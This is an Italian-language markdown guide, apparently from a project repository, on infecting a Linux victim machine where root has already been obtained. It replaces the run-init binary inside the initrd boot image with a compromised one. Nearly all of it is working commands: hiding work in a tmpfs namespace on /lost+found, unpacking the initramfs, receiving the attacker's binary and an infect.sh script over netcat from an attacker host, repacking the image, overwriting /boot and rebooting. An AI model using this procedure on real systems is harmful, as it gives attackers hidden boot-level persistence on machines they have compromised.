# Come infettare la macchina vittima
Per prima cosa è necessario ottenere una shell come `root` e quindi eseguire un exploit per scalare i privilegi. Per la realizzazione di questo attacco si assume che questo lavoro sia già stato eseguito.

Creiamo uno _scratch space_ per lavorare senza sporcare la macchina vittima:
```
unshare -f
```
> **Nota:** Questo permette di eseguire un program in un nuovo namespace e, se invocato senza target, lancia una shell. L'opzione `-f` (`--fork`) permette di forkare la shell come child di `unshare` invece di eseguirla in modo diretto, inoltre, mentre `unshare` è in wait per il child, ignora i segnali `SIGINT` e `SIGTERM` e non li inoltra al child. Quindi eventualmente vanno mandati direttamente al child.

Tutto ciò che viene scritto ora non può essere visto dagli altri processi, dunque montiamo un file system temporaneo sulla directory `/lost+found`:
```
mount -t tmpfs none /lost+found/
cd /lost+found/
```
È comodo creare due cartelle di lavoro che permettano di eseguire l'unpack e il repack dell'initial ramdisk:
```
mkdir tmp
mkdir tmp/extracted
```

Di seguito è mostrata la procedura manuale per la modifica dell'`initrd`. Tuttavia, questo lavoro è automatizzato dall'uso dello script [`infect.sh`](scripts/infect.sh), come mostrato successivamente.

## Unpack e modifica di `initrd`
Per copiare l'effettiva immagine del disco da infettare ed estrarne il contenuto, eseguiamo:
```
cp /boot/initrd.img-$(uname -r) tmp/
cd tmp/
unmkinitramfs initrd.img-$(uname -r) ./extracted/
cd extracted/
```
Fatto ciò, è possibile esplorare e modificare il FS `initramfs`.

Dal server attaccante si ottiene il binario compromesso `run-init` sfruttando `netcat`:
- vittima (ip: 192.168.1.151)
```
nc -lvnp 9999 | base64 -d | tar xz
```
- attaccante
```
tar cz run-init | base64 | nc 192.168.1.151 9999
```
Ricevuto il file sulla macchina vittima, possiamo sostituirlo all'originale:
```
mv run-init main/usr/bin/run-init
```
## Repack di `initrd`
Per ricreare l'immagine del disco è necessario ricostruire l'archivio compresso come segue:
1. compressione `early`:
```
cd early/
find . -print0 | cpio --null --create --format=newc > /lost+found/tmp/newinitrd
```
2. compressione `early2`:
```
cd ../early2/
find kernel -print0 | cpio --null --create --format=newc >> /lost+found/tmp/newinitrd
```
3. compressione `main`:
```
cd ../main/
find . | cpio --create --format=newc | lz4 -l -c >> /lost+found/tmp/newinitrd
```
## Sostituzione del disco
È possibile verificare che l'immagine del disco creata venga correttamente interpretata come l'originale:
```
cd /lost+found/tmp/
binwalk initrd.img-$(uname -r)
binwalk newinitrd
```
Se tutto è corretto, si può procedere con la sostituzione e il riavvio:
```
cp newinitrd /boot/initrd.img-$(uname -r)
reboot
```
## Infezione automatizzata
Per evitare l'esecuzione manuale di tutti i passaggi descritti in precedenza, è stato realizzato lo script [`infect.sh`](scripts/infect.sh), che fa esattamente quel lavoro.

In questo caso, una volta posizionati nello _scratch space_ su `/lost+found`, basterà eseguire:
- vittima (ip: 192.168.1.151)
```
nc -lvnp 9999 | base64 -d | tar xz
```
- attaccante
```
tar cz infect.sh run-init | base64 | nc 192.168.1.151 9999
```
Dopodiché, lato vittima infettiamo `initrd` ed eseguiamo il riavvio:
```
./infect.sh /lost+found/run-init
reboot
```